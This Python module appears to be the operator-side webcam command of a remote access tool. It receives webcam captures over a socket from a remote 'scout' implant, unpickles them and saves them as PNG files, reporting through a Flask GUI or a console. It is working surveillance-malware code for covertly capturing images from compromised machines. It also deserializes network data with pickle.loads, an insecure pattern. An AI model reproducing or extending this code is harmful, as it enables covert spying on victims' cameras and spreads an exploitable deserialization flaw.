import cv2
import os
import pickle
import library.modules.recv_all as recv_all
from datetime import datetime
import library.modules.config as config
config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify


def main(sock):
    if interface == "GUI":
        config.app.logger.info("[library/commands/direct_interface/webcam] - Waiting for raw webcam pickle to arrive")
    elif interface == "CUI":
        print(config.inf + 'Waiting for raw webcam pickle to arrive')
    raw_bytes = recv_all.main_recv(sock)
    file_name = datetime.now().strftime('%Y-%m-%d_%H-%M-%S.png')
    if type(raw_bytes) is str:
        if interface == "GUI":
            config.app.logger.info("[library/commands/direct_interface/screen] - Message from scout: " + raw_bytes)
            return jsonify({"output": "Success", "output_message": "Command Output", "data": "[*]Message from scout: " + raw_bytes})
        elif interface == "CUI":
            print(raw_bytes)
    elif type(raw_bytes) is bytes:
        img = pickle.loads(raw_bytes)
        img.save(file_name, 'PNG')
        if interface == "GUI":
            config.app.logger.info("[library/commands/direct_interface/screen] - Wrote file to: " + os.path.join(os.getcwd(), file_name))
            config.app.logger.info("[library/commands/direct_interface/screen] - Done")
            return jsonify({"output": "Success", "output_message": "Command Output", "data": "[+]Wrote file to: " + os.path.join(os.getcwd(), file_name)})
        elif interface == "CUI":
            print(config.pos + 'Wrote file to : ' + os.path.join(os.getcwd(), file_name))
            print(config.pos + 'Done')
